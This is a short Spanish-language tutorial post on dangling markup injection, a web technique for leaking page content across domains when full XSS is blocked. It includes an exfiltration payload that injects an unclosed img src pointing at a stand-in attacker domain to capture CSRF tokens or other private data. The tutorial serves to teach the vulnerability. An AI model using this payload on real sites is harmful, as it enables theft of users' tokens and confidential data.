---
title: Dangling Markup Injection
date: 2023-04-11
categories: [Vulnerabilities, Web]
tags: [xss, vulnerabilities, code_injection, web]
comments: false
---

Llamamos "Dangling Markup Injection" a la técnica para capturar datos entre dominios en situaciones en las que no es posible un ataque XSS completo.

Suponiendo que una aplicación incorpora datos controlables en sus respuestas de forma no segura:
```
<input type="text" name="input" value="DATOS CONTROLABLES
```
Supongamos también que la aplicación no filtra, sanitiza o escapa los caracteres > o ". Podemos usar la siguiente sintaxis para romper el valor del atributo citado y la etiqueta que lo encierra, y volver a un contexto HTML:
```
">
```

En este caso, podemos intentar realizar XSS. Pero supongamos que un ataque XSS normal no es posible debido a la sanitización de la entrada, CSP u otros obstáculos. Incluso en este caso, aún sería posible lanzar un ataque de "Dangling Markup Injection" utilizando un payload como:
```
"><img src='//attacker-website.com?
```

Este payload crea una etiqueta "img" y define el inicio de un atributo "src" que contiene una URL en el servidor del atacante. Tengamos en cuenta que el payload que inyectamos no cierra el atributo "src", el cual se queda "colgando". Cuando un navegador analiza la respuesta, está mirara adelante hasta que se encuentre una comilla simple para terminar el atributo. Todo hasta ese carácter se tratará como parte de la URL y se enviará al servidor del atacante dentro de la cadena de consulta de la URL. Todos los caracteres no alfanuméricos, incluidos los saltos de línea, se codificaron como URL.

La consecuencia del ataque es que podremos capturar parte de la respuesta de la aplicación después del punto de inyección, que puede contener datos confidenciales. Según la funcionalidad de la aplicación, esto podría incluir token CSRF, mensajes de correo electrónico o datos financieros.

Cualquier atributo que haga una solicitud externa se puede usar para el marcado pendiente.
